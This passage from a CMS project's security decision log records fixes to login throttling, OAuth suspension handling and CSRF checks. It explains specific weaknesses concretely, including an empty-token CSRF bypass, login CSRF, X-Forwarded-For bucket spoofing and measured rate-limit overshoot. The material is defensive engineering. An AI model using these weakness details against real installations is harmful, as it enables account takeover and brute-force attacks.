  - **Recorded and NOT fixed, each verified against source:** `verifyPasskeyAssertion()` stores the new signature count without comparing it to the stored one, so a cloned authenticator is not detected; it performs no `origin` check although its registration sibling does; and it reads `authData` offsets without a length guard, so a 32-byte `authenticatorData` produces an "uninitialized string offset" warning before failing closed. Also: the setup-wizard skip-list in `bootstrap.php` still matches by basename and was not extended with this endpoint, so during an incomplete setup the endpoint 302s to the wizard instead of answering JSON. All four go to the audit as **NEW-42** rather than being fixed in a slice already carrying two blocking corrections.
  - **One reviewer claim was REFUTED and is recorded as such:** the `security-auditor` was told L-016 documents a case-sensitivity defect and correctly pointed out that it does not — L-016 is the three-false-measurements lesson; the case-sensitivity defect is recorded in **D-045**'s review amendment. The brief was wrong, the reviewer was right, and it checked the underlying question anyway.
  - **Confirmed sound by both reviewers against source:** the takeover primitive is genuinely gone (the registration guard runs before `$userId` is even resolved, and `session_regenerate_id( true )` defeats fixation across the password stage); no user-substitution path exists, since `$userId` is always session-derived; the `$preAuthScripts` key change exempts exactly one new surface and nothing else, with traversal, symlinks and null bytes failing closed through `realpath()`; the CBOR/COSE fixture was checked byte-offset by byte-offset against the parser and genuinely matches it; the tampered-signature test is a real negative control; `Helpers::webauthnRpId()` has exactly two call sites and no other rpId derivation exists; and the two new catalogue keys are present in all 20 locales.
  - **Both reviewers again ran without a shell**, so the CSRF finding was *reported* from reading and *proven* in the main session by executing the request.

## D-059 — The counters become atomic within themselves, not under one wide lock; a lock that cannot be taken refuses the attempt
- Date / phase: 2026-07-26 / Phase 5, Sprint 6 kickoff (the fail direction and the scope of the two in-path findings were user decisions, taken before anything was written)
- Decision: **(a)** A new shared primitive at `installer/core/file-lock.php` holds a single `LOCK_EX` across read → decide → write, with a bounded retry deadline and an explicit fail-closed return. **(b)** `Auth::recordFailedAttempt()` / `resetLoginAttempts()` and `MCP\RateLimiter::check()` / `recordAuthFailure()` each run their whole read-modify-write inside it, closing **NEW-40**'s first half and **NEW-20** with one implementation. `recordFailedAttempt()` returns its post-increment count so the decision uses a fresh value. **(c)** `admin/login.php` gains an IP ceiling that **reuses** the shipped `RateLimiter::recordAuthFailure()` / `isAuthBlocked()`. **(d)** A lock that cannot be acquired within its deadline **refuses the login attempt**; an unreadable or undecodable counter file is treated as empty and logged loudly, never as "deny everyone". **(e)** **NEW-44** is fixed in path.
- **Why the audit's own recorded fix shape is refused, and this is the load-bearing part.** NEW-40 says *"the codebase already has the primitive — `ActionScheduler::acquireLock()` is a flock-based critical section. Wrap read-through-write in it."* Both halves fail against source:
  - `acquireLock()` (`action-scheduler.php:786`) is **private** and takes `LOCK_EX | LOCK_NB` — *skip if busy*, returning `null`. That is right for a scheduler and wrong for a counter: under the parallel brute force this fix exists to stop, every concurrent attempt would fail to acquire and skip its increment. That is a **deterministic** lost update, strictly worse than the racy one being replaced.
  - The read and the write are **not adjacent**. `isLockedOut()` runs at `auth.php:101` and `recordFailedAttempt()` at `:175`, with `UserManager::authenticate()` between them — which since the NEW-39 equalization performs a bcrypt verify on **every** branch, measured in D-056's own review at ~218 ms. A lock spanning read-to-write would serialise every login attempt on the install behind a 218 ms critical section: a denial-of-service lever built by a hardening slice.
- **So the criterion decides it, not the remedy (L-014).** The requirement is *a parallelized brute force must not get more than the nominal attempts*. That is met by making each counter atomic **within itself** — so every attempt is counted exactly once — and by closing the ~218 ms window with the IP ceiling rather than with a wider lock. The bcrypt figure is re-derived in the slice rather than quoted (L-015).
- **`ActionScheduler` keeps its own lock deliberately, and both sites say so.** Absorbing it would change a third subsystem's semantics from skip-if-busy to wait-then-act inside a hardening sprint — the tangling D-025, D-026, D-029 and D-031 each refused in turn. Two locks with genuinely different contracts is not duplication; two locks with the same contract would be, and that is what the primitive prevents.
- **Reusing `MCP\RateLimiter` for the IP ceiling is not a contradiction of D-056, and the distinction is recorded so it does not read as one.** D-056's implementation note 3 assessed this class for the **per-account** lockout and rejected it, because expressing 5-attempts/15-minutes through it would have meant changing `WINDOW_SECONDS` and `MAX_AUTH_FAILURES` for the MCP surface too — weakening a shipped control to avoid writing thirty lines. That reason does not apply here: the ceiling wants exactly the semantics already shipped (10 auth failures per 60 s, IP-keyed), `server.php:87,101` already consumes them, and **no constant moves**. This is the reuse rule applied, not bypassed.
- **Why the fail directions differ, stated rather than left to look inconsistent.** A lock that cannot be taken and a file that cannot be parsed are different failures. Not counting an attempt is precisely the amplification being closed, so a lock timeout **refuses** — the legitimate user retries and the lock is held for microseconds. Refusing everyone because a counter file is corrupt would instead make one unreadable file a total login outage, i.e. hand an attacker with write access to `data/` a denial of service in exchange for a race they could already only partly win. So a corrupt file starts a fresh counter and says so in the log.
- **NEW-44 is fixed in path because this slice would otherwise reproduce it.** `admin-gate.php:282,296` pass `'security'` as `$source`, and `Logger::write():122` drops any source that is not `'core'` unless a **plugin** with that ID has logging enabled — so every default-deny refusal of the S-07 gate writes nothing, Developer Mode on or off. This slice adds refusal logging of its own; adding it with the same mistake would be the fourth appearance of one defect. The minimal fix is taken — the callers pass `'core'` and keep the category in the message and context — rather than teaching `Logger` a reserved-source list, which is a contract change belonging to the **NEW-32** logging slice.
- **The concurrency test is the deliverable, not a formality.** NEW-20 has been carried since Sprint 1 slice 7 explicitly as *plausible and unproven*, because "neither the reviewer nor this slice ran the concurrency test that would settle it". This slice runs it: N parallel processes against one bucket, observed producing lost updates against the unfixed tree **before** its silence on the fixed tree is allowed to mean anything (L-016).
- Alternatives rejected (and why): **the audit's `acquireLock()` shape** (refuted above on two independent grounds); **one lock spanning `Auth::login()`** (genuinely removes the window, and serialises every login behind ~218 ms of bcrypt — a DoS lever); **fail open on a lock timeout** (today's behaviour, and exactly the hole: anyone able to provoke contention gets uncounted attempts); **fail closed on an unreadable file** (symmetrical-looking and wrong — it converts file corruption into a total login outage); **a new IP limiter of our own** (a second implementation of a control this product already ships, which this project treats as a defect); **fixing NEW-44 by teaching `Logger` reserved core sources** (better end state, and it is a contract change that belongs to the NEW-32 slice).
- Supersedes: the recorded fix shape inside audit **NEW-40** only. Closes **NEW-40**, **NEW-20** and **NEW-44**; opens **NEW-45**.
- **Implementation note 1 (slice 1, completing the slice) — the ceiling refused with the WRONG WORDS, and the owed test is what found it.** The first implementation of item (c) set `$error = __( 'auth.too_many_attempts' )` inside the throttle branch of `admin/login.php`. The refusal-wording block below it then ran unconditionally, took its `else` — `'throttled'` does not start with `account_locked:` — and **overwrote the message with `auth.login_failed`**. So a throttled caller was answered **HTTP 429 carrying the words "Incorrect username or password"**, and the `auth.too_many_attempts` key this same slice added to all **20** catalogues was unreachable in the product. Fixed by giving the page exactly one place that turns a refusal into words: the branch sets only `$result['error']`, and the block below maps it. Recorded rather than folded in silently for two reasons. First, `scripts/keel-verify`'s locale check could not have caught it — catalogue **parity** was perfect and the string was simply never rendered, which is **L-019's family**: the mechanism existed and the outcome did not. Second, it is the direct vindication of the slice being held open: the code, the i18n and the docs were all green and committed, and the defect lived in precisely the gap the three owed tests were owed for.
- **Implementation note 2 (slice 1) — the fail-closed branch and the gate's logging are proven from OUTSIDE the process that implements them.** `Auth::login()`'s `account_locked:` answer on an unrecordable failure is driven by a real second process holding `LOCK_EX` on `data/login_lockouts.json` (the `hold` mode added to `tests/fixtures/file-lock-worker.php`), not by a stubbed primitive — a mock would assert the mock. NEW-44 is proven by **reading the log file**, never the call, because reading the call is what said it worked for the whole life of the defect; and its twin refusal, the unresolvable-path branch that no HTTP request can reach, is pinned by a source scan in `AdminGateMapTest` asserting neither `klytos_log_*()` call in `admin-gate.php` passes a third argument at all. That scan is deliberately scoped to that one file: passing a plugin ID as `$source` is the correct, documented use of the parameter elsewhere in core, so a repository-wide version would be wrong rather than merely broad.
- **Review amendment (2026-07-26, before commit — L-015): both subagents ran on the finished diff, docs included. NEITHER returned a blocking finding, and between them they produced one measured correction to this decision's own claim, one FALSE claim in the approved sprint plan, and three new audit findings.** Recorded rather than folded in silently, because two of the items are corrections to my own text.
  - **The `security-auditor`'s main finding was a hypothesis, and MEASURING it confirmed it — so this decision's claim is narrowed rather than defended.** D-059 says the ~218 ms window is *"closed"* by the IP ceiling. It is not closed; it is bounded. The ceiling has the same check-then-act shape as the counters it replaces — `isAuthBlocked()` reads, `Auth::login()` spends ~218 ms on bcrypt, and only then does `recordAuthFailure()` write — so concurrent requests all observe "under the limit" before any has recorded. Measured with the bucket pre-filled to 9 of 10, one process per request, running the real sequence: **6 sequential → 1 served (bucket 10); 6 simultaneous → 6 served (bucket 15); 12 simultaneous → 12 served (bucket 21)**. The sequential run is the control that proves the instrument can see the difference. **No increment is lost** — the bucket lands on exactly 9 + N, which is what this decision's atomicity actually bought — so this is a check-then-act window, not NEW-20's lost update. Recorded as **NEW-46** with its fix shape (count the attempt, not the failure — a policy change needing its own decision) and stated with the numbers in `docs/reference/authentication.md`. **The auditor flagged it explicitly as unproven; this project settles those by execution (L-016), and the measurement is what turned a plausible note into a bounded, quantified limit rather than either a dismissal or an alarm.**
  - **My own measurement of that measurement was wrong first, and the disagreement is what caught it (L-023).** The probe's served-count used `grep -c` over result files carrying no trailing newline, so every worker's answer concatenated onto one line and the count came back **1** while the bucket said **15**. Two numbers about one event disagreed; the counter was the broken half. Before that, the probe's `require` path was wrong and it fataled loudly — the same broken-require that produced last session's false 0/20, caught this time because it screamed instead of returning a plausible zero.
  - **The `code-reviewer` found a claim in the APPROVED sprint plan that was simply false, and it was the mitigation for a recorded risk.** `docs/sprints/sprint-6.md` risk 1 said *"The ceiling is filterable"*, offered as the operator's remedy for **NEW-17** (a whole office behind one NAT address sharing the bucket). Re-derived: `installer/admin/login.php` and `installer/core/mcp/rate-limiter.php` contained **zero** `klytos_apply_filters` calls. **The filter was added rather than the sentence softened** — a mitigation an approved plan promises is part of the plan, not a description of it. `auth.login_ip_blocked` filters the decision at the login call site **only**: filtering inside `MCP\RateLimiter` would move constants shared with `core/mcp/server.php`, which is exactly what D-056's note 3 and this decision both refuse. It cannot reach the per-account lockout. **Proven with a REAL subscriber** — a plugin written into `installer/plugins/`, activated by writing plugin state the way the seeder does, and loaded by the product's own `PluginLoader` inside the SERVER process — because a filter registered in the test process would prove nothing about the process that serves the request, and **L-019** exists in this project because a hook with no reachable subscriber once read as a working feature. Proven in both directions: with the plugin active the burst is served, and with it gone the same burst is refused.
  - **Two further findings recorded, not fixed, each verified against source first.** **NEW-47** — the password-login POST runs no CSRF check, so an attacker holding their own account on the install can log a victim's browser into it; `SameSite=Strict` does not prevent it, because the victim has no session cookie to withhold. Pre-existing, and recorded **because this slice's own test now pins the absence** — a test asserting a property nobody decided is a decision made by omission. **NEW-48** — the 2FA emergency-email branch sets `security.no_email` and the shared outcome block below then overwrites it with `security.2fa_invalid_code`, so a user with no email on file is told their code is invalid. That is implementation note 1's defect one branch away in the same file; not fixed, because it is the 2FA handler and not the password-login handler this slice changed (D-031's narrowing, as applied to NEW-45 at this sprint's kickoff).
  - **NEW-17 was extended rather than duplicated.** The auditor found the entry only ever covered the *availability* half. In the case `getClientIp()` does trust — a loopback proxy — it takes the first, client-supplied `X-Forwarded-For` entry with no trusted-hop allow-list, so a proxy that appends (nginx's default) leaves the bucket key attacker-controlled: a per-request fresh bucket, or a deliberately filled bucket for a chosen victim. Same one remedy, so it is a second half of NEW-17 rather than a new finding, with its severity raised.
  - **A stale document that contained its own disproof was fixed.** `docs/reference/authentication.md`'s "Known limits" still said the lockout's read-modify-write is not atomic and that nothing throttles the endpoint — both false since this slice — while the same file's body, 100 lines above, described both fixes correctly. Worse, it recommended `ActionScheduler::acquireLock()` as the fix shape, **the exact remedy this decision refuted on two independent grounds**. A reader consulting the section named for exactly that purpose would have concluded the opposite of what the product does and acted on a remedy recorded as harmful.
  - **Two non-blocking items taken:** the lock-holding worker's sentinel cleanup moved into a `finally`, so a fixture cannot litter the install's real data directory when its driver dies first; and the source-scan matcher in `AdminGateMapTest` gained a docblock stating its known limit (it counts literal brackets with no string context, and works today only because both log messages' embedded `(security)` is balanced) rather than leaving the fragility implicit.
  - **One style note deliberately NOT taken, with the reason recorded.** The reviewer flagged that the new `if ($result['error'] === 'throttled') {` lacks the project's spaces-inside-parentheses convention. It joins an `if`/`elseif` chain whose other arms are pre-existing and unspaced; spacing only the new arm would leave one statement mixed. **D-053's review amendment settled the general question in the opposite direction** — the recorded convention outranks a neighbouring file's habit — so this is recorded as a judgement about one chain rather than as a precedent: the `__( 'auth.too_many_attempts' )` call inside it IS spaced, matching its neighbours.
  - **Confirmed sound by both reviewers against source, not merely read:** every path through the password-login POST sets `$result` before it is read and no path renders the wrong message or none; the 429 introduces no account-existence oracle (the lockout is keyed by the submitted username, bcrypt cost is equalized on every branch, and the ceiling is keyed by IP, so the 429/200 split was already visible before this fix and reveals nothing about whether an account exists); the throttled branch reaches nothing privileged and skips the bcrypt entirely; the gate's new log entry discloses nothing beyond its readers' existing access (`admin/logs.php` is `site.configure`, owner and admin, and the `script` value is never request-controlled); the playground snapshot covers `rate_limits.json`, `login_lockouts.json` and `data/config/site.json.enc`, so none of the new tests leak state; and the source-parity test genuinely matches the shipped form field for field.

## D-060 — A suspended user's OAuth token is refused at authentication, not at the gate
- Date / phase: 2026-07-26 / Phase 5, Sprint 6 kickoff (user decision, taken before anything was written)
- Decision: `TokenAuth::resolveUserActor()` (`installer/core/mcp/token-auth.php`) reads the record's `status` alongside its `role` and yields **null** for any non-active account, and the OAuth branch of `TokenAuth::validate()` requires a non-null actor to accept. *(Line citations removed after the slice's `security-auditor` pass: this entry was written at the kickoff citing `:227` and `:132-139`, correct at that moment and stale the instant the fix inserted lines into the same file. Named by method instead, so the next insertion cannot rot them — the D-053 treatment.)* A suspended user's OAuth access token therefore answers **401 Unauthorized** on the next request rather than continuing to work for up to an hour. Active revocation of the stored token is **not** built.
- **Why 401 and not 403, which was the smaller diff.** D-056's implementation note 1 moved the application-password credential exactly one layer earlier for exactly this reason: *"a credential the store cannot attribute denies, and it denies at authentication (HTTP 401) instead of at the authorization gate (HTTP 403)"*. Leaving OAuth to fail at the gate would give the three credential types three different answers to one operator action, and the audit entry for NEW-41 says plainly that the inconsistency is more dangerous than the gap — an operator who suspends an account will reasonably believe access is gone. One resolver, one answer.
- **One change covers both credential types because D-047 already built the resolver that way.** `resolveUserActor()` is the single DRY point for application passwords (`validate()`'s Basic-Auth branch) and OAuth (its bearer branch). For app passwords this is defence in depth — `validateAppPassword()` has required an active record since D-056 — and for OAuth it is the fix.
- **The consequence nobody asked for, stated rather than discovered:** an OAuth token whose user record is **gone** also moves from 403 to 401. That is the same direction D-056 chose for the same condition on the app-password path, and both still fail closed; only the layer moves.
- **Why revocation is refused here.** Deleting a suspended user's tokens is what an operator ultimately wants, and it couples `UserManager::update()` to the OAuth token store and raises a second question the audit already named — whether existing tokens should also be invalidated on a **role** change. That is its own decision with its own test point. `docs/reference/mcp-authorization.md` will state which of the two this slice delivers rather than implying the stronger one, because claiming revocation while shipping deny-at-validation would be the L-002 defect.
- Alternatives rejected (and why): **null actor only, 403 at the gate** (smallest diff and zero risk to the authentication path — but it leaves three credentials with three behaviours under one suspension, which is the finding); **401 plus revocation on suspension** (what an operator expects, and it is a lifecycle change with its own decision and test point — it would widen a sprint already carrying three findings); **shortening `ACCESS_LIFETIME`** (reduces the window without closing it, and slows every legitimate client to buy a fraction of the property a status check gives outright).
- Supersedes: none. Closes audit **NEW-41**; extends **D-047**'s resolver and mirrors **D-056**'s layer choice.
- **Implementation note 1 (slice 2) — an existing test pinned the OLD layer in its precondition, and it is a spec correction, not a test fix.** `McpActorResolutionTest::testOAuthTokenForAnUnknownSubjectResolvesToNoActor` asserted `validate() === true` *and* `getActor() === null` — i.e. "the OAuth token itself authenticates; the store simply cannot attribute it". That is precisely the layer this decision moves, so the assertion went red the moment the change landed. **This is D-056's implementation note 1 arriving one layer up, on the same class of test**: the PROPERTY the test exists for — an OAuth token whose subject is not a usable user must deny rather than escalate — is unchanged and is now satisfied **more strictly**, at authentication (401) instead of at the gate (403). Recorded here first, then changed, per Phase 5's "a wrong test is a spec correction". The test is **corrected, never weakened**: it now asserts `validate()` is **false** AND `getActor()` is null, so it still fails if such a token were ever to authenticate, and it fails in a second way if one were ever to carry an actor. Its class docblock's sentence about "a credential that still authenticates but cannot be attributed" was narrowed in the same edit to name the case where that remains true — a bearer token with no stamped role — because after this slice it is no longer true of OAuth.
- **Implementation note 2 (slice 2) — the fall-through, and why it is not an early `return false`.** The OAuth branch now sets `authMethod`/`authIdentifier`/`actor` only once a non-null actor exists, and otherwise falls through to step 3 (Basic Auth) rather than returning false immediately. That preserves the method's documented "tries in order" contract: a request carrying both a rejected OAuth token and valid Basic credentials for an active account still authenticates as that account. A bearer-only request — every real one — reaches step 3, finds nothing, and returns false, which `server.php` answers as **401**. Stated because "fall through" and "return false" are indistinguishable on the wire for the case under test and distinguishable for the case that is not.
- **Implementation note 3 (slice 2) — the status expression is the login path's, not a second one.** The guard is `( $user['status'] ?? 'active' ) !== 'active'`, byte-for-byte the expression `UserManager::authenticate()` uses (`user-manager.php:451`). A record with no `status` key therefore reads as active on both paths. Writing a stricter spelling here (deny when the key is absent) would have created a second definition of "is this account usable" — free to drift from the one the login form asks — which is the S-04 defect this project has already paid for once.
- **Review amendment (2026-07-26, before commit — L-015): both subagents ran in parallel on the finished diff, docs included, and NEITHER returned a blocking finding.** Recorded rather than folded in silently, because one of the three items taken is a real behavioural consequence of this slice that no one had written down, and another is a claim of mine that was argued rather than proven.
  - **The `security-auditor` found a consequence of the fix that is not a security boundary and IS an operability property, and it is now recorded as NEW-49.** A refused OAuth request is an *authentication failure*, so `server.php:101` now feeds `RateLimiter`'s auth-failure bucket where a suspended user's token previously answered 200 and fed nothing. **Re-verified against source before recording** (L-013/L-015): that bucket is keyed `'ip:' . $ip` (`rate-limiter.php:105-138`), shared by every credential from the address, and `isAuthBlocked()` runs at the top of **every** MCP request (`server.php:87`) — so a suspended integration with a retry loop can push a shared NAT or reverse-proxy address past 10 failures per 60 s and answer **429** to every other MCP client behind it. **It is not a new attacker capability, and that was checked rather than assumed:** any garbage bearer token already reaches the identical call at the identical cost of one unauthenticated request. What is new is that a legitimate, previously silent client can now cause it by accident. Severity LOW, bounded by the same shared-address precondition as **NEW-17**, whose remedy it waits on. Stated in `docs/reference/mcp-authorization.md` beside the behaviour that causes it, so an operator meets it where they would look.
  - **The fall-through of implementation note 2 was a documented claim with no test, and it now has one.** The auditor could find nothing pinning "a rejected OAuth token does not suppress an independently valid Basic credential", which is exactly the shape L-014 warns about — a behaviour asserted in a comment and in this decision, believed because it was written down. `McpActorResolutionTest::testARejectedOAuthTokenDoesNotBlockAValidBasicCredential` now drives it with a suspended subject's OAuth token in the `Authorization` header and an active account's application password in `PHP_AUTH_USER`/`PHP_AUTH_PW` (the two cannot share one header), asserting the method is `app_password`, the role is the Basic credential's, and nothing from the rejected branch leaks. **Proven in both directions:** replacing the fall-through with an early `return false` makes exactly this test fail ("Failed asserting that false is true") and nothing else, and the file was restored from a byte-for-byte backup afterwards.
  - **Line citations in this very entry had rotted, and the fix is the D-053 one.** D-060's Decision line cited `token-auth.php:227` and `validate():132-139`; both were correct when written at the kickoff and stale the instant this slice inserted lines into the same file (`resolveUserActor()` is now at `:252`). Corrected to name the method rather than the line, here and in `docs/sprints/sprint-6.md`, so the next insertion cannot rot them again.
  - **The `code-reviewer` returned no blocking finding and confirmed by reading what the slice claims:** `authMethod`/`authIdentifier`/`actor` are reset at the top of every `validate()` and assigned only inside the branch that succeeds, so no path leaves half-set identity; `Helpers::jsonResponse()` is `: never`, so `server.php`'s 401 terminates the request and cannot fall through to `setActor()` with a null actor; the status expression is byte-identical to the **three** other "is this account usable" checks in the codebase (`user-manager.php:451`, `auth.php:341`, `auth.php:762`), so no second semantic was introduced; `resolveUserActor()` has exactly two call sites and `getActor()` one; and the spec correction is strictly stronger than the assertion it replaced. Its one informational note is recorded rather than acted on: the new 401 path fires **no** hook, where the 403 gate has `mcp.access_denied` — a pre-existing gap in the resolver dating to D-047, outside this diff under D-031's narrowing.
  - **Both reviewers ran without a shell and said so unprompted.** The limit is recorded rather than glossed: neither could execute `phpunit`, `phpcs` or `keel-verify`, so every number in this slice rests on measurements taken in the main session. Where they could verify by reading — the branch analysis, the four status expressions, the call-site enumeration, the doc-versus-code comparison — they did, and those conclusions are theirs.
- **Implementation note 4 (slice 2) — `mcpCall()` was promoted, not copied.** The MCP HTTP request helper lived as a private method in `McpGateHttpTest` (Sprint 2 slice 2). This slice is the second MCP HTTP test class, so it moved to `tests/AdminHttpTestCase.php` as a protected method and the original now calls it — the same generalization, for the same recorded reason, as `routerScript()` in slice 6: a second copy would fork the three defects **L-008** records the moment one copy is fixed and the other is not.

## D-061 — NEW-47 and NEW-26 are pulled into Sprint 6 as slice 4, and the CSRF primitive itself is fixed in path
- Date / phase: 2026-07-27 / Phase 5, Sprint 6 (scope change — **explicit user decision**, taken on a question put at the slice-2 close and answered "adelanta la NEW-47")
- Decision: **(a)** The password-login POST in `installer/admin/login.php` verifies CSRF, closing audit **NEW-47**; the field is emitted by the shipped form through `klytos_csrf_field()`. **(b)** `installer/admin/reset-password.php`'s set-password POST does the same, closing **NEW-26** — the two are one defect class on one flow and close together. **(c)** `Auth::validateCsrf()` refuses an empty token or an empty expected value, closing **NEW-50**, found while proving (a) and fixed in path because (a) does not work without it. **(d)** The refusal is **HTTP 403 plus the re-rendered form**, worded from the ONE mapping D-059 implementation note 1 established, with a new locale key `auth.session_expired` in all 20 catalogues.
- **Why this is a scope change and not a slice detail:** Sprint 6 was planned and approved with three slices (NEW-40/NEW-20, NEW-41, NEW-42). This adds a fourth, ahead of slice 3, on the user's instruction. Recorded as a decision with its own estimate version rather than absorbed, per the scope-change playbook.
- **Why NEW-47 was worth pulling forward, stated in the terms that make it real:** login CSRF is not "an attacker logs into your account" — it is the reverse, which is why it reads as harmless. An attacker holding their own account on the install forces the victim's browser to submit the ATTACKER's credentials; the victim then works, unaware, inside an account the attacker controls, and everything they write, upload or connect is the attacker's to read. `SameSite=Strict` does not prevent it, because the victim has no session cookie to withhold — the request that creates one is the attack. And this project had a second reason: slice 1's source-parity test **pinned the absence**, so the gap had become a decision made by omission.
- **NEW-50 is the finding of this slice, and it was found by execution rather than by reading.** After `klytos_verify_csrf()` was added to the password branch, the token-less requests in `LoginCeilingHttpTest` were **still served**. The cause: `Helpers::verifyCsrf()` resolves a missing field to `''`, `Auth::validateCsrf()` compared it against a session value that is also `''` for an anonymous visitor, and **`hash_equals( '', '' )` returns TRUE** — measured, not assumed. So the check passed for exactly the state the login and password-reset forms live in, and every admin surface shared the hole: any POST arriving in a session that had never rendered a form was accepted with no token at all. The guard is placed in `validateCsrf()` — the one place that decides whether a token is valid — rather than as a `!== ''` at the login call site, because a local guard leaves every other caller with the hole. That is the S-04/S-07 shape, and this project has paid for it twice already.
- **Why 403 and re-render, not a redirect or a bare error:** the browser needs the form back to retry, and the throttle branch three lines away already answers this way (429 + re-render, D-059). One shape per page.
- **Why the wording is about the SESSION and not the credentials:** the realistic trigger for a legitimate user is a page left open until the session expired. Telling them "Incorrect username or password" would send them to change a password that was never wrong. `auth.session_expired` says what happened and what to do.
- **The 2FA branch's message was changed in the same edit, and that is in scope by necessity rather than opportunism:** it has verified CSRF since before this slice and answered the generic `common.error`. Leaving it would have meant one form on one page explaining the problem and its sibling saying "Error" — an inconsistency **created by this change**, so it is corrected with it. Nothing else in that branch is touched (D-031's narrowing; NEW-48 stays open with its trigger).
- **The test harness had to change with the product, and that was predicted rather than discovered.** `LoginCeilingHttpTest`'s source-parity test — written in slice 1 precisely for this — failed on the same run that added the field, naming the cause: *"The password form now emits a CSRF token that these requests do not send."* Its requests and `AuthLoginHttpTest`'s now fetch the session and the token **from the page itself** (`AdminHttpTestCase::formSession()`), never mint them: a harness-minted token would prove the harness agrees with itself, which is L-026 with the sign flipped. The parity assertion was inverted in the same slice and says so in place, so the flip is a record rather than a silent edit.
- **Proven in three separate TEMP-BREAK cycles**, each reverted from a byte-for-byte backup confirmed with `cmp`: the login check removed → the forged login **succeeded with 302** (three tests red); `validateCsrf()`'s guard removed → the token-less and empty-token logins were served and the reset form accepted (three red), which is what makes NEW-50 load-bearing rather than tidy; the reset check removed → the reset form accepted a token-less POST (one red).
- Alternatives rejected (and why): **NEW-47 alone, NEW-26 later** (smaller — but the two are the same defect class on the same flow and the second would need the same locale key, the same test shape and a second review round); **a `!== ''` guard in `login.php` only** (closes the login hole and leaves every other caller of `validateCsrf()` accepting an empty token — the by-omission shape this project has closed three times); **a redirect instead of a re-render** (loses the message and turns a refusal into something a caller cannot distinguish from success); **reusing `common.error`** (free, and it tells a locked-out user nothing); **a token bound to the form rather than the session** (a second CSRF mechanism beside the one every other surface uses — the duplication rule refuses it).
- Supersedes: none. Closes audit **NEW-47**, **NEW-26** and **NEW-50**. Extends **D-059**'s "one place turns a refusal into words" to a third refusal on the same page.

## D-062 — The road to v1 is recorded, in this order
- Date / phase: 2026-07-27 / Phase 5 (explicit user decision — the order was proposed with reasons and approved: *"crea toda la ruta"*)
- Decision: `docs/roadmap.md` is created and is the project's ordered plan to v1: **(1)** NEW-27 (the `.gitattributes` review) — first; **(2)** finish the hardening; **(3)** accessibility; **(4)** the theme package (D-023/D-024); **(5)** Phase 6; **(6)** Phase 7; **(7)** Phase 8, on request. Each step carries what it contains, why it sits there, and what it unblocks.
- **Why an ordered document exists at all:** the inventory of open work has always been recoverable — `docs/04-adoption-audit.md` and `docs/PROGRESS.md` hold it — but the ORDER was not written down anywhere, so every session re-derived it and proposed it again. That is a real recurring cost in a project whose per-session state re-read is already its dominant expense.
- **Why NEW-27 is first even though it is the smallest item:** it is one line of `.gitattributes`, and until it lands the 16 in-product guides ship **empty** in every release archive while the MCP tools' own descriptions declare five of them REQUIRED before creating page content. It is also the recorded prerequisite for the bilingual guides the user asked for on 2026-07-25 — translating first would duplicate content nobody receives.
- **Why accessibility sits above the theme package and not below it:** the measured baseline is ~20–25 % (admin) and ~15 % (generated output) against the WCAG 2.2 AA + EAA target recorded in **D-007**, and under the EAA the exposure for the generated output lands on Klytos's users. The theme package is what makes A-05 fixable at the SYSTEM level rather than site by site, so the two are sequenced deliberately: the admin half of accessibility does not wait for it, and the generated-output half is finished by it.
- **What the roadmap deliberately does NOT do:** it does not re-open any recorded decision, it does not commit to dates, and it does not promise a v1 scope beyond what the audit and PROGRESS already record. It is an ordering, and the user changes it by saying so.
- Alternatives rejected (and why): **no document, decide each sprint** (what has been happening — it costs a re-derivation every session and leaves the next chat to guess); **a full dated plan** (this project has no delivery date and inventing one would be fiction); **putting the theme package first** (it is the largest un-estimated item and would park the hardening and accessibility work behind a redesign).
- Supersedes: none. Bounds nothing; it orders what `docs/04-adoption-audit.md`, `docs/PROGRESS.md` and D-023/D-024 already contain.
- **Review amendment (2026-07-27, before commit — L-015): both subagents ran in parallel on the finished diff, docs included. The `code-reviewer` returned ONE BLOCKING finding, the `security-auditor` reached the same conclusion independently as its single non-blocking observation, and both were right.** Recorded in full, because what the finding led to is larger than the finding.
  - **BLOCKING, and correct: a THIRD anonymous login form.** `installer/core/mcp/oauth-authorize-view.php`'s `action === 'login'` branch calls `Auth::login()` with **no CSRF check**, and its form emits no token — while its sibling `action === 'authorize'` branch has verified CSRF all along. `Auth::login()` has exactly **two** call sites in the product, and this slice had closed one of them. The reviewer's sharpest point was about the documentation: `docs/reference/authentication.md`'s new sentence said *"Both forms a person can reach without logging in… verify a CSRF token"*, which this made **false as written** — the L-002 defect, in a document created by the same diff. Recorded as **NEW-51** and **fixed in path**, because closing one of two identical paths is the failure D-041's own review cycle wrote down; the doc now carries a three-row table naming the consent screen.
  - **And requesting that page to prove the fix found something far worse: NEW-52.** `/oauth/authorize` answered `Fatal error: Uncaught Error: Call to undefined function Klytos\Core\handleOAuthAuthorizeView()` — the router calls the view's function unqualified from `Klytos\Core` while it is declared in `Klytos\Core\MCP`, and PHP falls back to the global namespace, never to a sibling. **The OAuth consent screen has never rendered for anybody**, so the authorization-code flow could not be completed by any MCP client, ever. Confirmed **byte-identical at HEAD** before anything was concluded, so it is pre-existing. Fixed in path (one token) for the NEW-16 reason: the CSRF fix on that page cannot be proven while the page fatals. Recorded as **L-027** — *before adding a control to a surface, request that surface once* — and it also reframes **NEW-38**, which describes a 2FA gap on a page nobody could open.
  - **My own test marker was wrong, and the failure was the instrument rather than the product.** The refusal test asserted the response did not contain `Authorize`; that word is also the page's heading (*"Authorize Application"*), so the assertion fired on a correct response and, in a different ordering, passed on a wrong one. Settled by driving the sequence by hand — where it worked — then by dumping the real bodies, then by asserting on `value="authorize"` and `value="login"`, which exist only in the consent and login forms respectively. **L-018's shape** (a blocklist word that can legitimately appear), caught because a test that passed alone failed in its class — the same tell as slice 1's log-directory measurement.
  - **The two paren-spacing notes, one taken and one not, both on the record.** `Auth::validateCsrf()`'s new guard was written `if ($expected === '' …)` and is now `if ( $expected === '' … )`: a standalone statement, so **D-053's rule applies** — the project's recorded convention outranks a neighbouring file's habit. The new `'csrf'` arm in `login.php`'s wording map is deliberately left unspaced, because it is the head of an `if`/`elseif` chain whose other arms are pre-existing and unspaced, and spacing one arm leaves the statement mixed — the same judgement D-059's review amendment recorded for the same chain.
